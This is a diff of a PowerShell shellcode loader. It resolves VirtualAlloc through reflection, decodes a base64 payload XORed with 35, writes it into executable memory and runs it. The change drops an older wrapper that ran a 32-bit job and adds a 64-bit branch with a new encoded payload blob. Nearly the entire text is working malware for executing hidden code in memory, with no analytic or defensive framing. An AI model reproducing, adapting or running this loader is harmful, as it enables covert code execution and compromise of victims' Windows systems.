@@ -1,6 +1,5 @@
 Set-StrictMode -Version 2
 
-$DoIt = @'
 function func_get_proc_address {
 	Param ($var_module, $var_procedure)		
 	$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
@@ -21,23 +20,17 @@ function func_get_delegate_type {
 	return $var_type_builder.CreateType()
 }
 
-[Byte[]]$var_code = [System.Convert]::FromBase64String('38uqIyMjQ6rGEvFHqHETqHEvqHE3qFELLJRpBRLcEuOPH0JfIQ8D4uwuIuTB03F0qHEzqGEfIvOoY1um41dpIvNzqGs7qHsDIvDAH2qoF6gi9RLcEuOP4uwuIuQbw1bXIF7bGF4HVsF7qHsHIvBFqC9oqHs/IvCoJ6gi86pnBwd4eEJ6eXLcw3t8eagxyKV+S01GVyNLVEpNSndLb1QFJNz2Etx0dHR0dEsZdVqE3PbKpyMjI3gS6nJySSBycksOaSMjcHNLdKq85dz2yFN4EvFxSyMhY6dxcXFwcXNLyHYNGNz2quWg4HMS3HR0SdxwdUsOJTtY3Pam4yyn4CIjIxLcptVXJ6rayCpLiebBftz2quJLZgJ9Etz2Etx0SSRydXNLlHTDKNz2nCMMIyMa5FeUEtzKsiIjI8rqIiMjy6jc3NwMWntxGiON8FML0SmY+nECDufmf9H0fCb3tmfhTBT8PxTX0WurWg9l6CCQ+9GDyYJ0ivMuIRbxsCGSVPebLZHL4fjRzC2KXCfHDvYvaqlzI3ZQRlEOYkRGTVcZA25MWUpPT0IMFg0TAwt0Sk1HTFRQA213AxUNEhgDd1FKR0ZNVwwUDRMYA1FVGRISDRMKA09KSEYDZEZASEwuKSOOwX7s/4uPu1MSBucH0eB27cZhTpD1AibDGF5ObV95PvrEVqeST/jvPBQZG8lqaJfujs5y3+LklZ3Ws6H3dAa8HdvVOuF0K9DJzvQ4YM6lqY5I1jY5hMZOFHTq+CHsJUCNiQPmmU95EYIKAuzupTjVAk3hFoQKm6qcxwlVpqewrBrni4SP07zVG1bQdgxD+yx+KEw2PDYiI2fn16kYP3VrlIE1O9V+imko2rf7409U/0q+fNdbm2EsyUkCBUfoQCpHjzI5lXsrZhLl0zh8K7/OO2hAsdhyUuGzQ1COvOfIOWUMViNL05aBddz2SWNLIzMjI0sjI2MjdEt7h3DG3PawmiMjIyMi+nJwqsR0SyMDIyNwdUsxtarB3Pam41flqCQi4KbjVsZ74MuK3tzcEhoRDRIVGw0SDRIRIzEXdVs=')
-
-for ($x = 0; $x -lt $var_code.Count; $x++) {
-	$var_code[$x] = $var_code[$x] -bxor 35
-}
-
-$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
-$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
-[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)
-
-$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
-$var_runme.Invoke([IntPtr]::Zero)
-'@
-
 If ([IntPtr]::size -eq 8) {
-	start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
-}
-else {
-	IEX $DoIt
+	[Byte[]]$var_code = [System.Convert]::FromBase64String('32ugx9PL6yMjI2JyYnNxcnVrEvFGa6hxQ2uocTtrqHEDa6hRc2sslGlpbhLqaxLjjx9CXyEPA2Li6i5iIuLBznFicmuocQOoYR9rIvNFols7KCFWUaijqyMjI2um41dEayLzc6hrO2eoYwNqIvPAdWvc6mKoF6trIvVuEuprEuOPYuLqLmIi4hvDVtJvIG8HK2Ya8lb7e2eoYwdqIvNFYqgva2eoYz9qIvNiqCerayLzYntie316eWJ7YnpieWugzwNicdzDe2J6eWuoMcps3Nzcfkkjap1USk1KTUZXI2J1aqrFb6rSYplvVAUk3PZrEuprEvFuEuNuEupic2JzYpkZdVqE3PbIUHlrquJim+8BIyNuEupicmJySSBicmKZdKq85dz2yHp4a6riaxLxaqr7bhLqcUsjIWOncXFimch2DRjc9muq5Wug4HNJKXxrqtJrqvlq5OPc3NzcbhLqcXFimQ4lO1jc9qbjLKa+IiMja9zsLKevIiMjyPDKxyIjI8uB3NzcDHRsckUjWTcZ+/dRvJhYSELBb1dVqaseUSFqn636S0RBnstbEO9c0C6rnP3n9tL6Z5VK+0PtFJvAoRd15Bg82NeBo061pDj0wKMeihTalyN2UEZRDmJERk1XGQNuTFlKT09CDBYNEwMLQExOU0JXSkFPRhgDbnBqZgMaDRMYA3RKTUdMVFADbXcDFQ0SGAN0bHQVFxgDd1FKR0ZNVwwWDRMYA2FsamYaGHB1cGYKLikjozW4aqWpYDllTIdurfkbrL1p3nSbIBOkkwZ4BU/HU0hNOKsg7ieQu5OSU7ZiwI9cdZ8qLi7/8vmfvMv4RlIf1toq9pEtBkZlwC8/lIYs4kZe9RTRiaMsKirPh18eYIWjE1wQs1CAjsxtjWx2dvHAta0jUS/vUVlpfMz5tq1pETPw1Zacxe3/EmrAo2pbZ0cKXg/7hk5zfe51QvKRen5i7bQ1Xe/HA7ZodMaNtuBYRThQT5Qy5dQ8ZDJstmGQhWs6VnGnJQrvbZle+/KlyeQjYp3TloF13PZrEuqZIyNjI2KbIzMjI2KaYyMjI2KZe4dwxtz2a7BwcGuqxGuq0muq+WKbIwMjI2qq2mKZMbWqwdz2a6DnA6bjV5VFqCRrIuCm41b0e3t7ayYjIyMjc+DLvN7c3BIaEQ0SFRsNEg0SESMxF3Vb')
+
+	for ($x = 0; $x -lt $var_code.Count; $x++) {
+		$var_code[$x] = $var_code[$x] -bxor 35
+	}
+
+	$var_va = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll VirtualAlloc), (func_get_delegate_type @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))
+	$var_buffer = $var_va.Invoke([IntPtr]::Zero, $var_code.Length, 0x3000, 0x40)
+	[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $var_buffer, $var_code.length)
+
+	$var_runme = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($var_buffer, (func_get_delegate_type @([IntPtr]) ([Void])))
+	$var_runme.Invoke([IntPtr]::Zero)
 }
